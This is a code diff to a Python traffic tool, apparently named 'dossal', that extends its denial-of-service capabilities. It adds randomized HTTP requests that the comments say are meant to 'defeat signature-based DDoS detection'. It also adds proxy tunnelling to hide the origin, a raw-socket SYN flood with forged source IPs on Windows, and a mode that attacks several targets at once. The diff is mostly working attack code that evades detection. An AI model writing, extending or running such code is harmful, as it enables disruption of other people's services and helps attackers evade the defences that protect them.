@@ -914,13 +914,71 @@ async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
     stats.bytes += total * plen
 
 # ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
+def _random_http_req(host, path):
+    """Generate a randomized HTTP request to defeat signature-based DDoS detection.
+    Random path, random headers, random size, random User-Agent."""
+    import random as _rnd
+    # Random path variation: /, /index.html, /api/v1, /static/app.js, etc.
+    paths = [path, '/', '/index.html', '/api', '/static/main.js', '/css/style.css',
+             '/favicon.ico', '/health', '/status', '/api/v1/data', '/assets/app.abc123.js']
+    rpath = _rnd.choice(paths)
+    # Random query string
+    qs = f"?_={_rnd.randint(100000,999999)}" if _rnd.random() < 0.5 else ""
+    # Random User-Agent
+    uas = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
+        'dossal/' + VERSION,
+    ]
+    ua = _rnd.choice(uas)
+    # Random Accept header
+    accept = _rnd.choice([
+        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'application/json',
+        'text/plain,*/*',
+    ])
+    # Random Accept-Language
+    lang = _rnd.choice(['en-US,en;q=0.9', 'ko-KR,ko;q=0.9', 'ja-JP,ja;q=0.9', 'de-DE,de;q=0.9'])
+    
+    # Build request with random header order
+    headers = {
+        'Host': host,
+        'User-Agent': ua,
+        'Accept': accept,
+        'Accept-Language': lang,
+        'Connection': 'keep-alive',  # raw multiproc needs keep-alive
+    }
+    if _rnd.random() < 0.3:
+        headers['Accept-Encoding'] = 'gzip, deflate, br'
+    if _rnd.random() < 0.2:
+        headers['Referer'] = f'http://{host}/'
+    
+    # Random header order
+    hkeys = list(headers.keys())
+    _rnd.shuffle(hkeys)
+    header_str = ''.join(f"{k}: {headers[k]}\r\n" for k in hkeys)
+    req = f"GET {rpath}{qs} HTTP/1.1\r\n{header_str}\r\n"
+    return req.encode()
+
 def _mp_http_send(args_tuple):
     """Multi-process raw socket HTTP sender with 429 detection + IP recovery.
-    Uses keep-alive: one connection per process, only reconnect on 429 or error."""
+    Uses keep-alive: one connection per process, only reconnect on 429 or error.
+    Payload randomization defeats signature-based DDoS detection.
+    Proxy support: if proxy_host given, connect through HTTP CONNECT tunnel."""
     import time as _time
-    host, port, path, duration, src_ip, ip_pool = args_tuple
-    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
-           f"Connection: keep-alive\r\nUser-Agent: dossal/{VERSION}\r\n\r\n").encode()
+    if len(args_tuple) == 7:
+        host, port, path, duration, src_ip, ip_pool, proxy = args_tuple
+    else:
+        host, port, path, duration, src_ip, ip_pool = args_tuple
+        proxy = None
+    # Pre-generate pool of 10 randomized requests (fast cycling)
+    import random as _rnd
+    req_pool = [_random_http_req(host, path) for _ in range(10)]
+    req_idx = 0
+    req_counter = 0
+    REQ_REFRESH = 500  # Regenerate pool every 500 requests
     sent = 0
     errors = 0
     blocked = 0
@@ -940,11 +998,31 @@ def _mp_http_send(args_tuple):
                         s.bind((cur_ip, 0))
                     except OSError:
                         pass
-                s.connect((host, port))
+                if proxy:
+                    # Connect through proxy (HTTP CONNECT tunnel)
+                    p_host, p_port = proxy
+                    s.connect((p_host, p_port))
+                    connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode()
+                    s.sendall(connect_req)
+                    resp = s.recv(4096)
+                    if b'200' not in resp:
+                        s.close()
+                        errors += 1
+                        break
+                else:
+                    s.connect((host, port))
             except Exception:
                 errors += 1
                 break
         try:
+            # Cycle through pre-generated pool (fast)
+            req_counter += 1
+            if req_counter % REQ_REFRESH == 0:
+                req_pool = [_random_http_req(host, path) for _ in range(10)]
+                req_idx = 0
+            else:
+                req_idx = (req_idx + 1) % 10
+            req = req_pool[req_idx]
             s.sendall(req)
             data = s.recv(65535)
             if not data:
@@ -993,15 +1071,25 @@ async def raw_worker(name, url, stats, duration, stop, payload_size=0):
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
     
+    # Proxy (parsed once, passed to children)
+    proxy = None
+    if _PROXY[0]:
+        try:
+            from urllib.parse import urlparse as _up
+            _pp = _up(_PROXY[0])
+            proxy = (_pp.hostname, _pp.port or 8080)
+        except Exception:
+            proxy = None
+    
     if _SPOOF_MODE[0] and _SRC_IPS[0]:
         # Spoofing + recovery mode: each process gets a different src IP
         ip_pool = list(_SRC_IPS[0])  # Pass full pool so recovery can pick next IP
         targets = []
         for i in range(n_procs):
             src_ip = _get_src_ip(i, n_procs)
-            targets.append((host, port, path, duration, src_ip, ip_pool))
+            targets.append((host, port, path, duration, src_ip, ip_pool, proxy))
     else:
-        targets = [(host, port, path, duration, None, None)] * n_procs
+        targets = [(host, port, path, duration, None, None, proxy)] * n_procs
     
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_http_send, targets)
@@ -1133,12 +1221,49 @@ async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
 
 # ── SYN flood: connect only, never read ──────────────────────────
 def _mp_syn_flood(args_tuple):
-    """Multi-process SYN flooder: connect only (SYN)."""
+    """Multi-process SYN flooder: connect only (SYN).
+    On Windows (admin): raw socket + IP_HDRINCL for true SYN spoofing."""
     host, port, duration, src_ip = args_tuple
     import time as _time
     import errno as _errno
+    import struct as _struct
     conns = 0
     errors = 0
+    
+    if _IS_WINDOWS and src_ip:
+        # Windows: raw SYN with spoofed IP (no handshake, just fire SYN)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            sock.setsockopt(socket.IPPROTO_IP, IP_HDRINCL, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+            
+            src_bytes = socket.inet_aton(src_ip)
+            dst_bytes = socket.inet_aton(host)
+            # SYN packet: TCP header (20 bytes) with SYN flag (0x02)
+            tcp_header = _struct.pack('!HHIIBBHHH',
+                54321, port, 0, 0, 0x02, 0, 65535, 0, 0)  # sport, dport, seq, ack, offset=5, SYN, window, checksum, urg
+            # IP header
+            total_len = 20 + 20
+            ip_header = _struct.pack('!BBHHHBBH4s4s',
+                0x45, 0, total_len, 0, 0x4000, 64, 6, 0,  # TTL=64, DF flag
+                src_bytes, dst_bytes)
+            syn_packet = ip_header + tcp_header
+            
+            end = _time.time() + duration
+            while _time.time() < end:
+                n = 5000
+                try:
+                    for _ in range(n):
+                        sock.sendto(syn_packet, (host, port))
+                    conns += n
+                except Exception:
+                    break
+            sock.close()
+            return conns, errors
+        except (OSError, PermissionError):
+            pass
+    
+    # macOS/Linux: connect-based SYN (handshake)
     end = _time.time() + duration
     while _time.time() < end:
         s = None
@@ -1743,6 +1868,8 @@ examples:
         choices=['web', 'full', 'tls', 'proto'],
         help="Preset mode combo: web(raw+udp+syn), full(+rst), tls(httpsmp+h2+udp), proto(grpcmp+h2+udp)")
     ap.add_argument("--url", required=True)
+    ap.add_argument("--targets", default=None,
+        help="Comma-separated multiple target URLs (attack all simultaneously). Overrides --url")
     ap.add_argument("--connections", type=int, default=100,
         help="Connections per mode (default: 100)")
     ap.add_argument("--conns", default=None,
@@ -1947,10 +2074,25 @@ examples:
                     last_req, last_pkt, last_t = stats.requests, stats.packets, now
             live_task = asyncio.create_task(_live_printer())
 
-        await run(modes, args.url, args.connections, args.duration, stats, payload_size, args, mode_conns)
+        if args.targets:
+            # Multi-target: attack all targets simultaneously
+            target_urls = [t.strip() for t in args.targets.split(',') if t.strip()]
+            print(f"[multi] attacking {len(target_urls)} targets simultaneously", file=sys.stderr)
+            # Split threads across targets
+            per_target = max(1, args.threads // len(target_urls)) if args.threads else max(1, 8 // len(target_urls))
+            tasks = []
+            for i, turl in enumerate(target_urls):
+                print(f"[multi] target {i+1}/{len(target_urls)}: {turl}", file=sys.stderr)
+                tasks.append(run(modes, turl, args.connections, args.duration, stats, payload_size, args, mode_conns))
+            # Reduce threads per target for multi-target
+            if _UDP_NPROCS[0] > per_target:
+                _UDP_NPROCS[0] = per_target
+            await asyncio.gather(*tasks)
+        else:
+            await run(modes, args.url, args.connections, args.duration, stats, payload_size, args, mode_conns)
         if live_task:
             live_task.cancel()
-        report = stats.report(modes, args.url, args.connections, args.duration)
+        report = stats.report(modes, args.url if not args.targets else args.targets, args.connections, args.duration)
         if args.impact:
             report["impact"] = await impact_score(args.url, stats, args.duration, sampler, baseline_cpu)
         return report
